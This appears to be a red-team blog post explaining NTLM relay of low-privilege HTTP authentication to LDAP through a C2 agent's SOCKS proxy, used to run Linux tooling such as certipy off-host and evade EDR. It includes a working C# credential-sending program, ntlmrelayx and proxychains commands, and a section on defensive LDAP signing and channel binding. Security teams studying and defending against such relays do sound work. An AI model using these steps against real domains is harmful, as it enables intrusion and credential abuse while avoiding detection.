---
layout: post-with-toc
title: Operating Outside the Box - NTLM Relaying Low-Privilege HTTP Auth to LDAP
thumbnail-img: https://logan-goins.com/assets/img/ldap/figure-1.png
share-img: https://logan-goins.com/assets/img/ldap/figure-1.png
tags: [Windows, Active Directory, Adversary Simulation]
---

This blog was originally published on the SpecterOps blog [here](https://specterops.io/blog/2025/08/22/operating-outside-the-box-ntlm-relaying-low-privilege-http-auth-to-ldap/)

***TL;DR**** When operating out of a ceded access or phishing payload with no credential material, you can use low-privilege HTTP authentication from the current user context to perform a proxied relay to LDAP, then execute tooling through the SOCKS5 proxy to complete LDAP- related objectives completely off-host. *

## Introduction

Typically, when operating using command and control (C2) agents, a ceded access or phishing payload detonates on a workstation under the context of a low-privilege user with Active Directory access. Attempting to start reconnaissance and perform actions against the target environment using Windows-based tooling on our compromised host is commonly detected by memory scanning and behavioral analysis, mostly because Endpoint Detection and Response (EDR) is only getting more capable as time passes. While Beacon object files (BOFs) are generally a better practice of host-based execution than .NET assemblies, taking the tooling execution completely off-host seems to be the best way to ensure EDR doesn’t tamper with objectives being completed.

Usually, in the initial stages of the operation, the operator does not possess tangible credential material to take tool execution off-host. For example, the operator could be lacking a plaintext password or NT hash, Kerberos service tickets residing in memory could be expired or unusable, Microsoft [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) is enabled preventing theft of secrets, a strong password policy is enforced preventing the offline cracking of coerced NTLM challenge response, or a combination of multiple (or all of) these factors.

A different and unique way to solve this problem is to utilize the current context of our payload to authenticate our Linux tooling. This can be done by sending NTLM HTTP authentication back to our Linux host then relaying that authentication to LDAP on a domain controller (DC). This allows us to impersonate the low-privilege user and continue to operate out of their context off-host through a SOCKS5 proxy.

An impactful example where this could be useful is opening the doors and providing flexibility for using functionality from Linux tooling that might be missing or easily detected when using Windows tooling on a host without requiring credential theft. Take Active Directory Certificate Services (ADCS) reconnaissance, for example. The ADCS BOF that TrustedSec provides in their Situational Awareness [GitHub repository](https://github.com/trustedsec/CS-Situational-Awareness-BOF) does not perform automatic analysis of vulnerable certificate templates; only `Certify` and `certipy` perform this functionality. Instead of running the easily detected `Certify` .NET assembly in memory, you can use this technique to provide the current payload context to `certipy` for automated template analysis.

## Why HTTP? Specifics of NTLM Relay to LDAP

According to [Elad Shamir](https://specterops.io/blog/author/elad-shamir/)’s SpecterOps blog post [The Renaissance of NTLM Relay Attacks: Everything You Need to Know](https://specterops.io/blog/2025/04/08/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know/), the default SMB client on Windows negotiates session security with signing, and LDAP and LDAPS will require all subsequent messages after NTLMSSP to be signed with the session key. To harvest authentication through messages from our current user context and perform a successful relay to LDAP(S), we would be required to use an alternative protocol client, one which does not negotiate signing by default. Also as mentioned in the above blog: Usually, with a relay to LDAP or LDAPS, the WebClient service is utilized due to client-side session security not being negotiated when authentication is sent. On Windows, using a WebDav connection string in the format of `\\SERVER@PORT\PATH\TO\DIR` elicits a WebDAV request from the WebClient service executing in the context of `SYSTEM`, often meaning if we’re able to elicit WebDav authentication from WebClient, we can escalate privileges locally. Coercing WebClient authentication is incredibly valuable from an adversarial perspective because not only are we able to coerce relay-compatible WebDav authentication, but the context is always `SYSTEM`. A combination of both these factors is rare with coercion techniques.

While coercing WebClient authentication for relay to LDAP is perfectly valid, and will allow Local Privilege Escalation (LPE) on top of proxied access to LDAP as the machine account, some issues can prevent us from gaining this `SYSTEM` context. For example, the WebClient service could just be completely uninstalled in high-maturity environments, the Event Tracing for Windows (ETW) service trigger to start WebClient could be heavily monitored, preventing automated starts from low-privilege using a [BOF](https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/StartWebClient/SOURCE/StartWebClient.c). Additionally, the WebClient service could be unavailable due to the inability to drop files to disk such as a `.searchConnector-ms` file or execute shell commands such as a net use command which can both be used to start the WebClient service. With WebDav being essentially an extension of HTTP and utilizing the same auth process, generic HTTP authentication will work to harvest the Windows context, albeit unfortunately not from an elevated `SYSTEM` context.

So, why can’t we just write the `msDs-AllowedToActOnBehalfOfOtherIdentity` for resource-based constrained delegation (RBCD), `msDs-KeyCredentialLink` for Shadow Credentials, or `altSecurityIdentities` for ESC14, on the relayed low-privilege user object for account takeover so we can also access other services in addition to LDAP as our user context? Unfortunately, objects with the `objectClass` of `user` do not possess the ability to write these attributes to themselves, which is why relay attacks to LDAP using the machine account context with `objectClass` of `computer` are so powerful. Therefore, we’re pretty much forced to use the newly implemented LDAP `-socks` functionality in Impacket’s `ntlmrelayx`, which was just implemented [here](https://github.com/fortra/impacket/commit/9c8e4083e86cb005481daa834c858c17da9a734b) late last year and is currently in the Dev branch of Impacket with these changes scheduled for release with `v13.0`.

Keep in mind, this attack will fail when LDAP signing and LDAPS channel binding is enforced on the DC. These security options restrict any successful relay to LDAP, including generic HTTP. While Windows Server 2025 enforces these protocol security settings by default when promoting a server to a DC, a very small number of environments will have every DC configured with LDAP(S) signing and channel binding due to it being incredibly hard to implement successfully because of compatibility issues with existing infrastructure in large organizations.

## Execute Once and Stay Away!

Unfortunately, to take tooling execution off-host, execution on-host is pretty much always required before starting to proxy anything. Since only a simple HTTP request using the current context is required, pretty much anything which can send an HTTP request that starts an NTLMSSP negotiate handshake will work. A BOF is the best and least detectable way to initiate this request to prevent the requirement of .NET assembly execution; however, I cannot write BOFs. It took many hours of working on this to discover I cannot write a BOF. Therefore, I wrote a few lines of usable .NET to perform this action.

The simple .NET example is shown below:

```csharp
using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace SharpHTTP
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            var url = $"http://{args[0]}:{args[1]}/test"; 

            var handler = new HttpClientHandler
            {
                UseDefaultCredentials = true, // Uses current Windows user credentials
                PreAuthenticate = true,
                AllowAutoRedirect = true
            };

            using (var client = new HttpClient(handler))
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);
                    response.EnsureSuccessStatusCode();

                    string content = await response.Content.ReadAsStringAsync();
                    Console.WriteLine("Response received:");
                    Console.WriteLine(content);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Request failed: {ex.Message}");
                }
            }
        }
    }
}
```

As mentioned before, this example sends a simple HTTP request using Windows authentication the current context provides. The important part being the passed parameter `UseDefaultCredentials` of `true`. After executing this one .NET assembly, it’s possible to proxy all of our other actions to LDAP from Linux, staying away from EDR’s tight grip.

Before starting the attack portion, there are some environmental prerequisites that need to be configured. Firstly, ensure that the development version of Impacket is installed and holds the `ntlmrelayx` version which supports LDAP `-socks` connections.

The following commands can be used to install this environment.

```
git clone https://github.com/fortra/impacket
cd impacket
pipx install .
```

Now that the simple .NET assembly is compiled, which we can execute on host to send some HTTP authentication, plus the valid version of Impacket, configure the Mythic environment and `ntlmrelayx` server. In this example, the Apollo agent is used for testing this technique, but it’s possible to use any agent on any C2 framework which has SOCKS5 and reverse port forward capability.

After we’ve detonated our agent, we should see the callback appear in Mythic, and have the ability to interact and provide tasking to it.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfZDqYWRdwcHJpaaVYGd07kZmmf9g9JYNbvUpmLmOmlT9zAqWoIaWShu1-nBX4WnWoJKgc8srHfASLvBF0lnFyzQ32v6SSwDeZX0MQGgcpNbnBRvfzzFVe0SZgwiuvERetpvGLuOg?key=lgxa9ijeDVJzWrOBSz_ZPw)Next, configure a SOCKS5 proxy connection and a reverse port forward. An interesting aspect of performing a relay to LDAP using this technique is it’s possible to use any arbitrary port to reverse port forward our authentication back to the relay server. This ensures the attacker does not need to obtain local administrator access to use tools such as Nick Powers’s `smbtakeover` to free the *445/TCP* port binding from the SMB service. In this example, create a SOCKS5 proxy on port *7001/TCP* and initiate a reverse port forward from port *9001/TCP* on `WORKSTATION` to port *8001/TCP* on the relay server.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdSBotGU6DXypvC4m5RWy1BzXttsyNbgbnVyawD7eklKuMULPNy1go13-I4aXb3iuGT4WBIe7z4wAXVq4S58SG9ykU2EuxJrsWiWPKZ7zXTZnPWgaSCnqTAEJZvpATKs0ah2q3R?key=lgxa9ijeDVJzWrOBSz_ZPw)Finally, configure the `ntlmrelayx` relay server, allowing relayed authentication to be sent through the SOCKS5 proxy on the agent to the target DC.

First ensure the `/etc/proxychains4.conf` configuration is correct before continuing. In the initial part of the attack chain, the configuration should look something like the image below, only requiring changing SOCKS4 to SOCKS5 and modifying the port number to whatever port is configured to tunnel traffic into the target environment on the agent.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcUlS6xhN89r5J5nmAOmU831I28FVtEGPP4rRMYPRQMTNKQTwMRlESzZKviHd2oEmiuGDFG5BhC_7U1gA1hhAsDnoCVdnZJKIZG5SRSaeboaiSe71py6_oaNl8wsNndVOsF1KrFRw?key=lgxa9ijeDVJzWrOBSz_ZPw)Then start executing `ntlmrelayx` over `proxychains4` with the `-socks` flag, specifying the HTTP server to run on the reverse port forward port of 8001 and providing the target LDAP service on the Domain Controller.

The full command is:

```
proxychains4 ntlmrelayx.py -t ldap://10.2.10.10 -smb2support --http-port 8001 -debug -socks
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXddxhAZG_goMoirWifj6ADacZD1xSkmupxiEg2PRN515nmc5Z1I15_5BBK3V66A7EhQ4I_CtWytFHLFNdKVyjJ5BugSZ3rH6suCvKiNZv-mVt0N1r4pWFhig9mV_5_0PRsPcdadmw?key=lgxa9ijeDVJzWrOBSz_ZPw)Notice in the `ntlmrelayx` output that an additional SOCKS5 proxy has been opened on port *1080/TCP* .

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXersXoIbN5GjxPEzSEOe4JLnVqXB9z1l0_6uh-Xea8bYWKIO4Qb-6oePmdDb-HcZJdizRJMKGPYyquxIgWPBQ1-5ZGLKA_1rVLd3_-GdaPhrvIKcGd4XheWpI1mps0IkGY58lFgmQ?key=lgxa9ijeDVJzWrOBSz_ZPw)

Now it’s time to execute the .NET assembly to send the relay compatible HTTP request to the reverse port forwarded `127.0.0.1:9001` and start the relay attack. First compile, then register the simple HTTP C# code I provided earlier into a binary titled `SharpHTTP.exe`, then provide the host address of loopback and the reverse port forwarded port of *9001/TCP* as execution parameters.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcY_-eHyzKTZ-oa9VYFvI-25Jy5x3KEtud8EMqcZxO4eFPzhVDiWzergnP5SgKRzskmlOTPtTHwuQ9-77eK2fO7cbyqZViuQs6UW7Up7V9jeuSQLrPQJqQdtEqc_6kcS2HbmF6NAQ?key=lgxa9ijeDVJzWrOBSz_ZPw)While the output from the assembly returns an `HTTP 404` (i.e., “Not Found”) response, the attack executed successfully. Looking at the relay server, valid authentication was sent and relayed to LDAP on the DC.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeOXEe4944qaUNJzXrL2HtjyTr9A_2r8qUs0A6klDpHGCdeex21qOMfUqAhrmRGCKKqIFmA_RlxWTZUMwbwK-5oisr8WLQE1ukI4IdRby7GjnotkOORMUNR7OocOWj3opZVOfax5g?key=lgxa9ijeDVJzWrOBSz_ZPw)Clearly the SOCKS5 session to LDAP has been added successfully as demonstrated in the above output.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXc2KGTluufEySM2SOidY8YRBLAsrEyz2wsS1a6mGawpdP2Fn8wRxb0Gma9UgJ9HlnxtE5bmbs06VM_jcMU0XugcUjQZh5QHLPsG4BncmiOTdN4HOtIy5ABgd9rd91q3hpN4visVDA?key=lgxa9ijeDVJzWrOBSz_ZPw)

Now that a SOCKS5 session through `ntlmrelayx` has been opened on port *1080/TCP* through our relay host, it’s possible to use Linux tools and proxy to LDAP in the target environment while authenticating successfully. Before starting to execute tools through `ntlmrelayx`, if your relay server is the same host you would like to execute your Linux tools on, you’ll need to change `/etc/proxychains4.conf` once more to proxy your tools through `ntlmrelayx` (port *1080/TCP* ) instead of directly through the C2 agent (port *7001/TCP* in our example), since port *1080/TCP* is now proxying through the C2 agent with a direct connection to LDAP on the DC.

As you can see below, set the SOCKS5 port to *1080/TCP* .

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcdR0ypA20dNG3ZOj0OdOF7st0b0aaVZITAyu2oaF1xw6A2ywEOMYYReMkkWFdgnksFhI5VFZ8yc5991_Yq7rlqEcxnnXZH9oo9bQNxrB3fN1KX0_s9stCcht2-ibU7N8JNc6q9?key=lgxa9ijeDVJzWrOBSz_ZPw)And now, when executing Linux-focused tools through the `ntlmrelayx` proxy, credentials are automatically autofilled in transit. For example, when executing `certipy find` through the proxy.

Note that in the following command, we’re using the `-dc-only` flag and using `-ldap-scheme ldap` so `certipy` doesn’t attempt to access any other ports which we can’t access through the proxy. Also note that, in the `-p` flag where we would typically provide the user’s password, we can provide any dummy value and authenticate successfully. This is because `ntlmrelayx` intercepts the traffic and uses the current relay context for authentication.

```
proxychains4 certipy find -dc-only -ldap-scheme ldap -dc-ip 10.2.10.10 -u 'domainuser@ludus.domain' -p aaa
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfoU5GlJtEznk01I7mMRD9eKWXk5L6g7bI4aij6I7TmbrMc-al9uqfVFK4m0rBNEQvNuecH71S7HgHRWQDUCGrhGz_cC0UdQ09KZmb8UK0q-_5sCJNV34gkn3DJ05Z_5zz7T4LDNA?key=lgxa9ijeDVJzWrOBSz_ZPw)As you can see, certipy has pulled valid ADCS data from LDAP through the ntlmrelayx proxy successfully, which can be used to automatically identify vulnerable templates without requiring the execution of Certify or other tools on host.

A simplified diagram visualizing the relay, the required steps, and all the moving parts is shown below:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeG3qnnXTkXjD_qXpm3WiaoNk3yrEiEqEnqRDYJKLDYVhpJnIH1N4l2ZNPu95_kdFeURQsQjObKWFzDwyTpAEVGsVbhUJUOe0_41k1eFQg1L5YPvHspq5mF2sJev5DhD39lNiwt-g?key=lgxa9ijeDVJzWrOBSz_ZPw)## Defensive Considerations: Keeping the Attackers Battling EDR

Since the main use-case of this technique is to get off host and away from EDR, the best thing defenders can do is attempt to keep adversaries on the endpoint, where endpoint monitoring and logging occur. Stealing any credential is bad, but stealing material credentials on hosts such as NT hashes or plaintext passwords is usually going to be logged, set off alerts, or result in preventative measures being executed. Effectively stealing credentials from the current context using HTTP auth will have significantly less telemetry on host, but is only possible when LDAP signing and LDAPS channel binding are not required on DCs. Enabling LDAP signing and LDAPS channel binding will force an attacker to steal credentials on-host for proxying tooling into the network, whether it be Kerberos tickets or NT hashes. EDR has a much greater likelihood of stopping material credential stealing than the sending of a simple HTTP request.

The Microsoft advisory for enabling LDAP channel binding and LDAP signing can be found [here](https://msrc.microsoft.com/update-guide/advisory/ADV190023), as well as full detailed recommendations for doing so [here](https://support.microsoft.com/en-us/topic/2020-2023-and-2024-ldap-channel-binding-and-ldap-signing-requirements-for-windows-kb4520412-ef185fb8-00f7-167d-744c-f299a66fc00a).

For quick reference, setting the following group policy options should ensure all of your DCs have LDAP signing and channel binding enabled and required. First, navigate to the following path in the Group Policy Object (GPO) editor:

```
Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options
```

Then, to enable LDAP signing, find the option: `Domain controller: LDAP server signing requirements`, and set it to `Require signing`.

For LDAPS channel binding, find the option: `Domain controller: LDAP server channel binding token requirements`, and set it to `Always`.

Ensure to audit and test these changes before deploying them into a production environment.

Additionally, keep in mind that both LDAP signing and LDAPS channel binding are required to be set for a relay to be impossible. If LDAP signing is on but LDAPS channel binding is not, a relay to LDAPS is possible and vice versa.

## Conclusion

When operating out of low-privileged domain user context in an environment, it’s best to proxy traffic through your C2 agent to avoid on-host execution. To get to this step, usually credential material has to be stolen in the form of a plaintext password, NT hash, or Kerberos ticket from the compromised workstation. Performing these actions of credential theft on the host can cause alerts or other difficulties may arise. An alternative method of obtaining proxied authentication to a critical service in the target environment such as LDAP(S) is relaying Windows HTTP authentication and reverse port forwarding that authentication back to our relay server, where we relay that intercepted authentication back through a proxy to a target DC. After establishing a connection through our relay server, we can proxy traffic through our relay server and operate out of our harvested context.
